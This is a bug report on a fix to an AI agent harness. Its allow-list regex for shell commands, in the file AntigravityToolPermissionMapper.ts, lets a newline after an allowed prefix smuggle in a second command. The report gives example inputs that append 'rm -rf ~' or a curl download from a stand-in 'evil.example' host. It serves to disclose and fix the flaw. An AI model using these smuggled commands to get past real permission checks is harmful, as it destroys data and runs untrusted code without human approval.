# Antigravity shell allow rules accept a second command after a newline

- **Found:** 2026-11-01 by bug-hunt final step (claude-cli)
- **Area:** `src/core/harness/antigravity/AntigravityToolPermissionMapper.ts`
- **Resolution:** fixed in this commit

## Symptom

In `custom` tool-permission mode, an allowed prefix such as
`shell(git status:*)` is translated to

```
command(regex:git\s+status(?:\s[^;&|`$()<>\r\n]*)?)
```

The tail's character class excludes newlines, but the `\s` in front of it
matches `\n` (in both JS and Go RE2). A newline right after the allowed
prefix therefore starts a second command, and agy auto-approves it:

- `"git status\nrm -rf ~"` is allowed
- `"git status\ncurl https://evil.example/x.sh -o x.sh"` is allowed
- `"git status && whoami"` is refused, as intended

The `\s+` that joins the words has the same flaw: `"git\nstatus"` matches.
Every Antigravity allow rule ending in `:*` is affected.

## Steps to Reproduce

1. Build the rules with `AntigravityToolPermissionMapper` for
   `allowedTools: ["shell(git status:*)"]` in custom mode.
2. Test the emitted regex, anchored the way agy anchors it
   (`^(?:…)$`), against `"git status\nrm -rf ~"`: it matches.

## Root Cause

`SHELL_ALLOW_TAIL` (line 69) starts with `\s`. `parseShellCommand` (around
line 106) joins command words with `\s+` for allow and deny rules alike.
`docs/harnesses/antigravity-cli.md` and `docs/workflows/permissions.md`
promise that an allow rule refuses a chain containing an unlisted command.
`dev/implemented/ANTIGRAVITY_PERMISSION_RULES_PLAN.md` probed a literal space
and recorded the two-line command as refused. The unit test in
`src/test/unit/HarnessToolPermissionMappers.test.ts` (around line 345) only
covers a newline _before_ the prefix (`"echo a\ngit push"`).

## Suggested Fix

In allow mode, use horizontal whitespace only: the tail becomes
`(?:[ \t][^;&|`$()<>\r\n]*)?`, and the word joiner becomes `[ \t]+`. Keep the
deny form broad (`\s+`): a deny rule should keep matching across
whitespace. Add cases expecting no match for `"git status\nwhoami"`,
`"git\nstatus"`and`"git status\r\nwhoami"`, and confirm the existing
positive cases still pass.
